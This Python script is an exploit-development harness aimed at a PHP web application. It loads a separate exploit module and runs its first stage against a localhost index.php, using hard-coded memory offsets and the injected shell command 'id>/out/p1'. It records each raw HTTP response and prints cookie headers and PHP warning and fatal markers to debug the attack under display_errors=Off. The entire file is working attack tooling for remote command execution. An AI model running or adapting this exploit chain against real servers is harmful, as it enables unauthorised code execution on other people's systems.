#!/usr/bin/env python3
"""Capture the classic stage-1 A/B pair under display_errors=Off to pin the blocker."""
import importlib.util
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("exp", os.path.join(HERE, "repo/exploit.py"))
exp = importlib.util.module_from_spec(spec)
spec.loader.exec_module(exp)

url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18089/index.php"
outdir = sys.argv[2] if len(sys.argv) > 2 else os.path.join(HERE, "off_classic_capture")
os.makedirs(outdir, exist_ok=True)

t = exp.Target(url, timeout=60.0, verbose=True)
ex = exp.Exploit(t, "id>/out/p1", zif_offset=0x465370, dtor_offset=0x65eb60,
                 htdata_offset=0x690d8, profile="bookworm")

seq = [0]
orig = t.post


def rec(body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
    seq[0] += 1
    resp = orig(body, boundary, read_cap=read_cap, timeout=timeout,
                extra_headers=extra_headers)
    open(os.path.join(outdir, f"resp_{seq[0]:02d}.raw"), "wb").write(resp)
    hdr = resp.split(b"\r\n\r\n", 1)[0]
    sc = [l for l in hdr.split(b"\r\n") if l.lower().startswith(b"set-cookie")]
    print(f"[probe] req#{seq[0]} body={len(body)} resp={len(resp)} "
          f"set-cookie={[len(l) for l in sc]} "
          f"warning={b'Warning' in resp} fatal={b'Fatal' in resp}", flush=True)
    if sc:
        print("        " + sc[0][:160].decode("latin1", "replace"), flush=True)
    return resp


t.post = rec
chunk = ex.stage1()
print("stage1 chunk =", hex(chunk) if chunk else 0)
print("files:", sorted(os.listdir(outdir)))
